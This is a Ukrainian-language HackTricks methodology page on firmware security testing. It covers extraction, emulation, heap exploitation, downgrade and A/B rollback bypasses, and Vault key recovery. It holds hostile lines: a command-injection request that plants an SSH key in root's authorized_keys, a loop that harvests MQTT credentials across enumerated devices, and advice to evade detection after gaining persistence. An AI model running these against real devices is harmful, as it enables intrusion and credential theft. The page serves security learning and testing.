# Аналіз Firmware

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Вступ**

### Пов'язані ресурси


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware — це необхідне програмне забезпечення, яке забезпечує коректну роботу пристроїв, керуючи взаємодією між апаратними компонентами та програмним забезпеченням, з яким взаємодіють користувачі, і сприяючи їй. Воно зберігається в постійній пам'яті, завдяки чому пристрій може отримати доступ до важливих інструкцій одразу після ввімкнення, що зрештою призводить до запуску операційної системи. Дослідження та потенційна модифікація firmware є критично важливим кроком для виявлення вразливостей безпеки.<sup>[[2]](#references)[[3]](#references)</sup>

## **Збір інформації**

**Збір інформації** — це критично важливий початковий крок для розуміння складу пристрою та технологій, які він використовує. Цей процес передбачає збір даних про:

- Архітектуру CPU та операційну систему, на якій він працює
- Особливості bootloader
- Апаратну структуру та datasheets
- Метрики codebase і розташування вихідного коду
- Зовнішні бібліотеки та типи ліцензій
- Історію оновлень і регуляторні сертифікації
- Архітектурні діаграми та діаграми потоків
- Оцінки безпеки та виявлені вразливості

Для цього надзвичайно корисними є інструменти **open-source intelligence (OSINT)**, а також аналіз будь-яких доступних компонентів open-source software за допомогою ручних та автоматизованих процесів перевірки. Такі інструменти, як [Coverity Scan](https://scan.coverity.com) і [Semmle’s LGTM](https://lgtm.com/#explore), пропонують безкоштовний static analysis, який можна використовувати для пошуку потенційних проблем.

## **Отримання Firmware**

Отримати firmware можна різними способами, кожен із яких має власний рівень складності:

- **Безпосередньо** з джерела (розробників, виробників)
- **Зібрати** його за наданими інструкціями
- **Завантажити** з офіційних сайтів підтримки
- Використовувати запити **Google dork** для пошуку розміщених файлів firmware
- Отримати прямий доступ до **cloud storage** за допомогою таких інструментів, як [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Перехоплювати **оновлення** за допомогою man-in-the-middle технік
- **Витягувати** його з пристрою через такі інтерфейси, як **UART**, **JTAG** або **PICit**
- **Перехоплювати** запити на оновлення під час комунікації пристрою
- Виявляти та використовувати **hardcoded endpoints оновлень**
- **Знімати дамп** із bootloader або мережі
- **Виймати та зчитувати** мікросхему пам'яті, якщо інші способи не спрацювали, використовуючи відповідні апаратні інструменти

### Логи лише через UART: примусово отримати root shell через env U-Boot у flash

Якщо UART RX ігнорується (доступні лише логи), ви все одно можете примусово запустити init shell, **відредагувавши blob середовища U-Boot** офлайн:<sup>[[6]](#references)</sup>

1. Зніміть дамп SPI flash за допомогою кліпси SOIC-8 і програматора (3.3V):
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. Знайдіть розділ env U-Boot, відредагуйте `bootargs`, додавши `init=/bin/sh`, і **перерахуйте CRC32 env U-Boot** для blob.
3. Запишіть назад лише розділ env і перезавантажте пристрій; у UART має з'явитися shell.

Це корисно для embedded-пристроїв, у яких shell bootloader вимкнено, але розділ env можна записувати через зовнішній доступ до flash.

## Аналіз firmware

Тепер, коли у вас **є firmware**, потрібно витягти з нього інформацію, щоб зрозуміти, як із ним працювати. Для цього можна використовувати різні інструменти:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Якщо за допомогою цих tools не вдалося знайти багато інформації, перевірте **entropy** образу за допомогою `binwalk -E <bin>`: якщо entropy низька, то, ймовірно, дані не зашифровані. Якщо entropy висока, дані, імовірно, зашифровані (або певним чином стиснуті).

Крім того, ви можете використовувати ці tools для вилучення **файлів, вбудованих у firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Або [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)), щоб дослідити файл.

### Отримання файлової системи

За допомогою описаних вище tools, наприклад `binwalk -ev <bin>`, ви мали змогу **вилучити файлову систему**.\
Зазвичай Binwalk вилучає її в **папку, названу за типом файлової системи**. Найчастіше це один із таких типів: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Ручне вилучення файлової системи

Іноді Binwalk **не має magic byte файлової системи у своїх сигнатурах**. У таких випадках використовуйте Binwalk, щоб **знайти зміщення файлової системи, вилучити стиснуту файлову систему** з бінарного файлу та **вручну вилучити** файлову систему відповідно до її типу, використовуючи наведені нижче кроки.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Виконайте наведену **dd-команду**, щоб витягти файлову систему Squashfs.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Також можна виконати наведену нижче команду.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Для squashfs (використовується у наведеному вище прикладі)

`$ unsquashfs dir.squashfs`

Після цього файли будуть у каталозі "`squashfs-root`".

- Файли архівів CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Для файлових систем jffs2

`$ jefferson rootfsfile.jffs2`

- Для файлових систем ubifs із NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Аналіз Firmware

Після отримання firmware важливо дослідити його структуру та потенційні вразливості. Цей процес передбачає використання різних інструментів для аналізу та вилучення цінних даних з образу firmware.

### Інструменти початкового аналізу

Нижче наведено набір команд для початкової перевірки бінарного файлу (позначеного як `<bin>`). Ці команди допомагають визначити типи файлів, вилучити рядки, проаналізувати бінарні дані та зрозуміти структуру розділів і файлових систем:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Щоб оцінити стан шифрування образу, перевіряють **ентропію** за допомогою `binwalk -E <bin>`. Низька ентропія вказує на відсутність шифрування, тоді як висока ентропія може свідчити про шифрування або стиснення.

Для вилучення **вбудованих файлів** рекомендуються такі інструменти й ресурси, як документація **file-data-carving-recovery-tools** і **binvis.io** для перевірки файлів.

### Вилучення файлової системи

За допомогою `binwalk -ev <bin>` зазвичай можна вилучити файлову систему, часто до каталогу, названого за типом файлової системи (наприклад, squashfs, ubifs). Однак коли **binwalk** не може розпізнати тип файлової системи через відсутні magic bytes, необхідне ручне вилучення. Воно передбачає використання `binwalk` для визначення зміщення файлової системи, після чого команда `dd` використовується для вилучення файлової системи:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Після цього, залежно від типу файлової системи (наприклад, squashfs, cpio, jffs2, ubifs), для ручного видобування вмісту використовуються різні команди.

### Аналіз файлової системи

Після видобування файлової системи починається пошук вразливостей безпеки. Особлива увага приділяється небезпечним мережевим daemon'ам, hardcoded credentials, API endpoints, функціональності update server, некомпільованому коду, startup scripts і скомпільованим бінарним файлам для offline analysis.

**Ключові розташування** та **елементи**, які слід перевірити, включають:

- **etc/shadow** і **etc/passwd** для пошуку облікових даних користувачів
- SSL-сертифікати та ключі в **etc/ssl**
- Файли конфігурації та скрипти на наявність потенційних вразливостей
- Вбудовані бінарні файли для подальшого аналізу
- Поширені web-сервери та бінарні файли IoT-пристроїв

Кілька інструментів допомагають виявляти конфіденційну інформацію та вразливості у файловій системі:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) і [**Firmwalker**](https://github.com/craigz28/firmwalker) для пошуку конфіденційної інформації
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) для комплексного аналізу firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) і [**EMBA**](https://github.com/e-m-b-a/emba) для static і dynamic analysis

### Перевірки безпеки скомпільованих бінарних файлів

І вихідний код, і скомпільовані бінарні файли, знайдені у файловій системі, необхідно ретельно перевіряти на наявність вразливостей. Такі інструменти, як **checksec.sh** для Unix-бінарних файлів і **PESecurity** для Windows-бінарних файлів, допомагають виявити незахищені бінарні файли, які можна експлуатувати.

## Отримання хмарної конфігурації та облікових даних MQTT через похідні URL-токени

Багато IoT-хабів отримують конфігурацію для конкретного пристрою з cloud endpoint, який має такий вигляд:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Під час аналізу firmware можна виявити, що `<token>` локально виводиться з ідентифікатора пристрою за допомогою hardcoded secret, наприклад:

- token = MD5( deviceId || STATIC_KEY ) і представлений у вигляді шістнадцяткового рядка у верхньому регістрі

Ця конструкція дає змогу будь-кому, хто дізнався deviceId і STATIC_KEY, відтворити URL і отримати cloud config, яка часто розкриває plaintext MQTT credentials і префікси topics.

Практичний workflow:

1) Отримати deviceId з UART boot logs

- Підключіть UART-адаптер 3.3V (TX/RX/GND) і перехопіть logs:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Шукайте рядки, які виводять шаблон URL хмарної конфігурації та адресу брокера, наприклад:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Відновлення STATIC_KEY і алгоритму token із firmware

- Завантажте binary-файли в Ghidra/radare2 і виконайте пошук шляху до config ("/pf/") або використання MD5.
- Підтвердьте алгоритм (наприклад, MD5(deviceId||STATIC_KEY)).
- Обчисліть token у Bash і переведіть digest у верхній регістр:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Збір cloud config і облікових даних MQTT

- Сформуйте URL і отримайте JSON за допомогою curl; обробіть його через jq, щоб витягти secrets:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Зловживання незашифрованим MQTT і слабкими ACL для topic (якщо наявні)

- Використовуйте відновлені облікові дані, щоб підписатися на maintenance topics і шукати чутливі події:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Перелічуйте передбачувані ідентифікатори пристроїв (у великому масштабі, з дозволом)

- У багатьох екосистемах вбудовані байти OUI/продукту/типу vendor, за якими слідує послідовний суфікс.
- Ви можете перебирати candidate IDs, програмно виводити tokens і отримувати configs:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Примітки
- Завжди отримуйте явний дозвіл перед спробами масового перерахування.
- За можливості надавайте перевагу емуляції або статичному аналізу для отримання секретів без модифікації цільового обладнання.

Процес емуляції firmware дає змогу виконувати **динамічний аналіз** роботи пристрою або окремої програми. Цей підхід може стикатися з проблемами, пов’язаними із залежностями від обладнання чи архітектури, але перенесення root filesystem або певних бінарних файлів на пристрій із відповідними архітектурою та порядком байтів, наприклад Raspberry Pi, або на попередньо створену віртуальну машину може сприяти подальшому тестуванню.

### Емуляція окремих бінарних файлів

Для дослідження окремих програм надзвичайно важливо визначити порядок байтів і CPU architecture програми.

#### Приклад з MIPS Architecture

Щоб емулювати бінарний файл для MIPS architecture, можна використати команду:
```bash
file ./squashfs-root/bin/busybox
```
А щоб встановити необхідні інструменти емуляції:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Для MIPS (big-endian) використовується `qemu-mips`, а для little-endian бінарних файлів слід використовувати `qemu-mipsel`.

#### Емуляція архітектури ARM

Для ARM-бінарних файлів процес аналогічний: для емуляції використовується емулятор `qemu-arm`.

### Повна емуляція системи

Такі інструменти, як [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) та інші, забезпечують повну емуляцію firmware, автоматизуючи цей процес і сприяючи dynamic analysis.

## Практичний dynamic analysis

На цьому етапі для аналізу використовується реальне або емульоване середовище пристрою. Важливо зберігати shell-доступ до ОС і файлової системи. Емуляція може неідеально відтворювати взаємодію з hardware, тому іноді може знадобитися перезапуск емуляції. Під час аналізу слід повторно перевірити файлову систему, використати вразливості відкритих вебсторінок і мережевих сервісів, а також дослідити вразливості bootloader. Перевірки цілісності firmware мають вирішальне значення для виявлення потенційних backdoor-вразливостей.

## Техніки runtime analysis

Runtime analysis передбачає взаємодію з процесом або бінарним файлом у його робочому середовищі за допомогою таких інструментів, як gdb-multiarch, Frida та Ghidra, для встановлення breakpoint і виявлення вразливостей за допомогою fuzzing та інших технік.

Для embedded targets без повноцінного debugger **скопіюйте статично скомпонований `gdbserver`** на пристрій і під’єднайтеся віддалено:<sup>[[6]](#references)</sup>
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Zigbee / відображення повідомлень radio-co-processor

В IoT-хабах RF stack часто розділений між **radio MCU** і процесом Linux userland. Корисний workflow полягає у відображенні такого шляху:<sup>[[8]](#references)</sup>

1. **RF frame** в ефірі
2. **controller-side parser** на radio MCU
3. **serial/UART text or TLV protocol**, що пересилається до Linux (наприклад `/dev/tty*`)
4. **application dispatcher** в основному daemon
5. **protocol-specific handler / state machine**

Ця архітектура створює дві цілі для reversing замість однієї. Якщо controller перетворює binary radio frames на textual protocol, наприклад `Group,Command,arg1,arg2,...`, відновіть:

- **message groups** і dispatch tables
- Які messages можуть надходити з **network**, а які — безпосередньо від controller
- Точні **manufacturer-specific discriminator fields** (наприклад Zigbee `manufacturer_code` і custom `cluster_command`)
- Які handlers доступні лише під час **commissioning**, discovery або firmware/model download phases

Для Zigbee capture pairing traffic і перевірте, чи target досі використовує default **Link Key** `ZigBeeAlliance09`. Якщо так, sniffing commissioning traffic може розкрити **Network Key**. Zigbee 3.0 install codes зменшують цей exposure, тому зафіксуйте, чи tested device справді їх enforces.

### Manufacturer-specific protocol handlers і FSM-gated reachability

Vendor-specific Zigbee/ZCL commands часто є кращою ціллю, ніж standardized clusters, оскільки вони передають дані до **custom parsing code** і внутрішніх **FSMs** із менш перевіреною validation.<sup>[[8]](#references)</sup>

Практичний workflow:

- Виконайте reverse engineering command dispatcher, доки не знайдете **vendor-only handler**.
- Відновіть таблиці **FSM state**, **event**, **check**, **action** і **next-state**.
- Визначте **transitional states**, які автоматично переходять далі, а також retry/error branches, що зрештою виконують reset або free attacker-controlled state.
- Підтвердьте, які legitimate protocol exchanges потрібні, щоб перевести daemon у vulnerable state, замість припущення, що buggy handler завжди reachable.

Для timing-sensitive protocols packet replay із Python framework може бути надто повільним. Надійніший підхід — емулювати legitimate device на реальному hardware (наприклад **nRF52840**) за допомогою vendor-grade stack, щоб можна було надати правильні **endpoints**, **attributes** і commissioning timing.

### Клас bugs із fragmented-download в embedded daemons

Повторюваний клас firmware bugs зустрічається у **fragmented blob/model/configuration downloads**:<sup>[[8]](#references)</sup>

1. **first fragment** (`offset == 0`) зберігає `ctx->total_size` і виділяє `malloc(total_size)`.
2. Наступні fragments перевіряють лише attacker-controlled **packet-local** fields, наприклад `packet_total_size >= offset + chunk_len`.
3. Copy використовує `memcpy(&ctx->buffer[offset], chunk, chunk_len)` без перевірки щодо **original allocated size**.

Це дає attacker змогу надіслати:

- Перший valid fragment із **small** declared total size, щоб примусити small heap allocation.
- Наступний fragment із **expected offset**, але більшим `chunk_len`.
- Forged packet-local size, який проходить fresh checks, водночас переповнюючи originally allocated buffer.

Якщо vulnerable path розташований за commissioning logic, exploitation має містити достатню **device emulation**, щоб перевести target у потрібний model-download або blob-download state перед надсиланням malformed fragments.

### Protocol-driven `free()` triggers

В embedded daemons найпростішим способом trigger heap metadata exploitation часто є не "wait for cleanup", а **force the protocol's own error handling**:<sup>[[8]](#references)</sup>

- Надішліть malformed follow-up fragments, щоб перевести FSM у **retry** або **error** states.
- Перевищте retry threshold, щоб daemon **resets context** і frees corrupted buffer.
- Використайте цей predictable `free()`, щоб trigger allocator-side primitives до того, як process crash з інших причин.

Це особливо корисно проти **musl/uClibc/dlmalloc-like** allocators в embedded Linux, де corruption chunk metadata може перетворити unlink/unbin logic на write primitive. Стабільний pattern полягає в corruption **size field**, щоб redirect allocator traversal до **fake chunks**, розміщених усередині overflowed buffer, замість негайного clobbering реальних bin pointers і crash process.

## Binary Exploitation and Proof-of-Concept

Розробка PoC для виявлених vulnerabilities вимагає глибокого розуміння target architecture і programming мовами lower-level. Binary runtime protections в embedded systems трапляються рідко, але коли вони присутні, можуть знадобитися techniques на кшталт Return Oriented Programming (ROP).

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation:** uClibc використовує fastbins, подібні до glibc. Пізніша large allocation може trigger `__malloc_consolidate()`, тому будь-який fake chunk має пройти checks (sane size, `fd = 0` і surrounding chunks, які вважаються "in use").<sup>[[6]](#references)</sup>
- **Non-PIE binaries under ASLR:** якщо ASLR enabled, але main binary є **non-PIE**, addresses у binary `.data/.bss` стабільні. Можна target region, який уже нагадує valid heap chunk header, щоб розмістити fastbin allocation на **function pointer table**.
- **Parser-stopping NUL:** коли виконується parsing JSON, `\x00` у payload може зупинити parsing, зберігши trailing attacker-controlled bytes для stack pivot/ROP chain.
- **Shellcode via `/proc/self/mem`:** ROP chain, який викликає `open("/proc/self/mem")`, `lseek()` і `write()`, може розмістити executable shellcode у known mapping і перейти до нього.

## Prepared Operating Systems for Firmware Analysis

Operating systems, такі як [AttifyOS](https://github.com/adi0x90/attifyos) і [EmbedOS](https://github.com/scriptingxss/EmbedOS), надають pre-configured environments для firmware security testing, оснащені необхідними tools.

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS — це distro, призначений для security assessment і penetration testing Internet of Things (IoT) devices. Він значно заощаджує час, надаючи pre-configured environment з усіма необхідними tools.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): operating system для embedded security testing на базі Ubuntu 18.04, попередньо оснащений tools для firmware security testing.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

Навіть коли vendor реалізує cryptographic signature checks для firmware images, **version rollback (downgrade) protection часто відсутній**. Коли boot- або recovery-loader лише перевіряє signature за допомогою embedded public key, але не порівнює *version* (або monotonic counter) image, що flash-иться, attacker може легітимно встановити **older, vulnerable firmware, яка все ще має valid signature**, і таким чином повторно ввімкнути patched vulnerabilities.<sup>[[4]](#references)</sup>

Типовий attack workflow:

1. **Obtain an older signed image**
* Візьміть його з public download portal, CDN або support site vendor.
* Extract його з companion mobile/desktop applications (наприклад, усередині Android APK у `assets/firmware/`).
* Retrieve його зі third-party repositories, таких як VirusTotal, Internet archives, forums тощо.
2. **Upload or serve the image to the device** через будь-який exposed update channel:
* Web UI, mobile-app API, USB, TFTP, MQTT тощо.
* Багато consumer IoT devices expose *unauthenticated* HTTP(S) endpoints, які приймають Base64-encoded firmware blobs, decode їх server-side і trigger recovery/upgrade.
3. Після downgrade exploit vulnerability, яку було patched у newer release (наприклад command-injection filter, доданий пізніше).
4. За бажанням flash latest image назад або disable updates, щоб уникнути detection після отримання persistence.

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
У вразливій (пониженій) версії firmware параметр `md5` безпосередньо додається до shell-команди без санітизації, що дає змогу ін'єктувати довільні команди (у цьому випадку — увімкнути root-доступ на основі SSH-ключа). У пізніших версіях firmware додали базовий фільтр символів, але відсутність захисту від downgrade робить це виправлення марним.<sup>[[4]](#references)</sup>

### Витягування Firmware із мобільних застосунків

Багато виробників вбудовують повні образи firmware у свої супутні мобільні застосунки, щоб застосунок міг оновлювати пристрій через Bluetooth/Wi-Fi. Ці пакети зазвичай зберігаються в APK/APEX без шифрування, у шляхах на кшталт `assets/fw/` або `res/raw/`. Такі інструменти, як `apktool`, `ghidra` або навіть звичайний `unzip`, дають змогу витягувати підписані образи без фізичного доступу до обладнання.<sup>[[4]](#references)</sup>
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Обхід anti-rollback, реалізований лише в updater, у дизайнах зі слотами A/B

Деякі vendors справді реалізують anti-downgrade **ratchet**, але лише всередині логіки *updater* (наприклад, у routine UDS через CAN, recovery command або userspace OTA agent). Якщо **bootloader** згодом перевіряє лише підпис/CRC образу та довіряє partition table або slot metadata, захист від rollback усе ще можна обійти.<sup>[[7]](#references)</sup>

Типовий слабкий дизайн:

- Firmware metadata містить як дескриптор версії, так і **security ratchet** / монотонний лічильник.
- Updater порівнює ratchet образу зі значенням, збереженим у persistent storage, і відхиляє старіші підписані образи.
- Bootloader не аналізує цей ratchet і лише перевіряє header, CRC та підпис перед boot обраного слота.
- Активація слота зберігається окремо в partition table або per-slot generation counter і **не прив'язана криптографічно** до точного digest firmware, який було перевірено.

Це створює primitive **validate-one-image / boot-another-image** у dual-slot системах. Якщо attacker може змусити updater позначити slot B як наступну ціль boot, використовуючи актуальний підписаний образ, а потім перезаписати slot B до reboot, bootloader все одно може boot-нути downgraded image, оскільки він довіряє лише вже зафіксованій slot metadata.

Поширений abuse pattern:

1. Завантажити **актуальну підписану** firmware у пасивний слот і виконати звичайну validation/switch routine, щоб layout позначив цей слот як наступний active.
2. **Поки що не виконувати reboot**. Повторно увійти в slot-preparation/erase routine у тій самій session.
3. Використати stale boot-state або stale slot-selection logic, щоб updater стер **той самий physical slot**, який щойно було promoted.
4. Записати в цей слот **старішу, але все ще підписану** firmware.
5. Пропустити validation routine, яка застосовує ratchet, і безпосередньо виконати reboot.
6. Bootloader обирає promoted slot, перевіряє лише підпис/integrity і boot-ить старий образ.

Що слід шукати під час reverse engineering реалізацій A/B update:

- Вибір слота, що залежить від **boot-time flags**, які не оновлюються після успішного switch.
- Routine на кшталт `prepare_passive_slot()`, яка стирає слот на основі stale state, а не **поточного зафіксованого layout**.
- Function на кшталт `part_write_layout()`, яка лише збільшує **generation counter** / active flag і не зберігає hash перевіреного образу.
- Ratchet checks, реалізовані в userspace або updater code, але **відсутні в ROM / bootloader / secure boot stages**.
- Erase або recovery routines, які залишають слот позначеним як bootable навіть після видалення та повторного запису його вмісту.

### Контрольний список для оцінювання логіки update

* Чи достатньо захищені transport/authentication *update endpoint* (TLS + authentication)?
* Чи порівнює device **version numbers** або **monotonic anti-rollback counter** перед flashing?
* Чи перевіряється image всередині secure boot chain (наприклад, signatures перевіряються ROM code)?
* Чи застосовує **bootloader той самий ratchet**, що й updater, замість перевірки лише signature/CRC?
* Чи **прив'язана slot activation metadata до validated firmware digest/version**, або слот можна змінити після promotion?
* Після успішного switch чи змушений device виконати reboot, або наступні update/erase routines усе ще доступні в тій самій session?
* Чи виконує userland code додаткові sanity checks (наприклад, дозволену partition map, model number)?
* Чи використовують *partial* або *backup* update flows ту саму validation logic?

> 💡  Якщо чогось із переліченого бракує, платформа, ймовірно, вразлива до rollback attacks.

## Вразлива firmware для практики

Щоб практикувати пошук vulnerabilities у firmware, використовуйте наведені нижче проєкти вразливої firmware як відправну точку.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Відновлення ключів розшифрування firmware зі state вбудованих KMS/Vault

Коли update image поєднує невеликі plaintext metadata з великим blob із високою ентропією, перед brute-forcing виконайте container triage:<sup>[[1]](#references)</sup>

- Зробіть dump headers, offsets і line boundaries за допомогою `hexdump`, `xxd`, `strings -tx`, `base64 -d` та `binwalk -E`.
- `Salted__` зазвичай означає формат OpenSSL `enc`: наступні 8 bytes є salt, а решта bytes — ciphertext.
- Base64 field, який після декодування має рівно `256` bytes, є сильною ознакою того, що ви маєте справу з RSA-2048 ciphertext, який обгортає random firmware password/session key.
- Detached PGP material у тому самому file часто захищає лише authenticity; не вважайте, що це механізм confidentiality.

Якщо static key hunting (`grep`, `strings`, пошук PEM/PGP) не дає результатів, виконуйте reverse engineering **operational decrypt path**, а не лише шукайте private keys:

- Decompile updater / management binary і простежте, хто читає encrypted blob, який helper/API його unwrap-ить і яке logical key name він запитує.
- Шукайте в extracted root filesystem KMS state (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), а також unit files та init scripts.
- Розглядайте plaintext `vault operator unseal ...`, recovery keys, bootstrap tokens або local KMS auto-unseal scripts як еквівалент private-key material.

Якщо appliance постачається з оригінальним Vault binary та storage backend, replaying цього environment зазвичай простіший, ніж reimplementing Vault internals:
```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```
Маючи root у клонованому KMS:

- Зробіть transit keys експортованими лише всередині ізольованого клона: `vault write transit/keys/<name>/config exportable=true`
- Експортуйте unwrap key: `vault read transit/export/encryption-key/<name>`
- Спробуйте recovered RSA key з точною парою padding/hash, яку використовує KMS. Невдала розшифровка PKCS#1 v1.5 і невдала стандартна розшифровка OAEP **не** доводять, що ключ неправильний; багато потоків на базі Vault використовують OAEP із SHA-256, тоді як поширені бібліотеки за замовчуванням використовують SHA-1.
- Якщо payload починається з `Salted__`, точно відтворіть KDF постачальника на основі OpenSSL (`EVP_BytesToKey`, часто MD5 на застарілих appliance), перш ніж виконувати розшифровку AES-CBC.

Це перетворює проблему «encrypted firmware» на більш загальну: **відновити operational keys на стороні appliance, а потім офлайн відтворити точні параметри unwrap + KDF**.

## Навчання та сертифікації

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Злам firmware за допомогою Claude: навички senior-рівня, автономність junior-рівня](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Методологія тестування безпеки firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Практичний IoT Hacking: повний посібник з атак на Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Експлуатація zero days у покинутому hardware — блог Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Як Smart Device за $20 надав мені доступ до вашого дому](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Тепер ви бачите mi: тепер ви Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv — експлуатація Tesla Wall Connector через роз'єм зарядного порту — частина 2: обхід anti-downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
